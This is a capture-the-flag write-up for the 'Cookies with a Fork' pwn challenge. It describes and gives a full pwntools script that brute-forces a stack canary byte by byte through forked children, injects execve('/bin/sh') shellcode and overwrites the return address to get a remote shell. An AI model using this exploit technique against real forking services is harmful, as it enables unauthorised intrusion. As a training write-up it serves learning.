# Write up for Cookies with a Fork

## Overview

For this challenge we are doing some rev, buffer overflow, shellcode, and canary bruteforcing. We have an application that 
lets us repeatedly write some data to an address using a forked child process, and tells us where the data is stored. 


## Solution

### Flag 1

Our goal is to give ourselves a shell to control their server. First note that they give us the address where we're writing to. Similar
to Shell Emporium, we will create a payload involving ```b"/bin/sh\x00"``` and some assembly to call the execv syscall at the address holding that string, which 
will execute the bash shell binary. This can be done with the assembly
```Python
shellcode = asm(
    f"""mov rax, 59; mov rdi, {address}; mov rsi, 0; mov rdx, 0; syscall""",
    arch="amd64",
    os="linux",)
```

Then, we want to buffer overflow and overwrite the return address with the address of our assembly.

We know the buffer is 200 bytes long and the canary is 
immediately after the buffer from our analysis of the decompiled code in Ghidra. 

Unfortunately there's a canary in the way. 
Fortunately, they let us repeat our input using fork, so the canary doesn't change. 

Thus, we can just bruteforce the individual bytes of the canary 
by only sequentially bruteforcing one byte at a time and storing the part when it doesn't give us a stack smashing error. With this, 
it becomes possible to bruteforce the canary (8*(2^8) vs 2^64 options). Then we can overwrite the return address, execute the assembly 
to start a shell and give us the flag.

A solution script implementing this is below

```Python
#!/usr/bin/env python3

from pwn import *
context.terminal = ['tmux', 'split']

p = remote("REDACTED", REDACTED)
# p = process("./cookies")

print(p.recvline())
p.recvuntil("store it at ")

# Get address our payload will be stored at
address = p.recvline()
address = address[:-2]
address = int(address, 16)


# Write our payload to execute bash with an execv syscall
shellcode = asm(
    f"""mov rax, 59; mov rdi, {address}; mov rsi, 0; mov rdx, 0; syscall""",
    arch="amd64",
    os="linux",)

# Note the length of our full payload for our buffer overflow
payload_len = len(b"/bin/sh\x00") + len(shellcode)


# Initialize canary guess
canary = b''
# Initialize current canary byte guess
current_byte = 0
# Find canary by brute forcing each byte sequentially
for i in range(8):
    result = b'*** stack smashing detected ***: terminated\n'
    current_byte = -1
    # Until we don't get a stack smashing error
    while result == b'*** stack smashing detected ***: terminated\n':
        current_byte+=1
        # Ensure our canary guess doesn't include a newline, which will stop our buffer writing
        if p8(current_byte) != b"\n":
            # send payload and canary guess
            p.send(b"/bin/sh\x00")
            p.send(shellcode)
            p.send(b"a"*(200-payload_len))
            p.sendline(canary + p8(current_byte))
            result = p.recvline()
            p.recvline()
    canary += p8(current_byte)
    print(canary)
# Let the user know what the true canary is
print("canary is: ")
print(canary) 

# Send payload with canary
p.send(b"/bin/sh\x00")
p.send(shellcode)
p.send(b"a"*(200-payload_len))
p.send(canary)
p.sendline(p64(address+8)*8)

p.interactive()
```

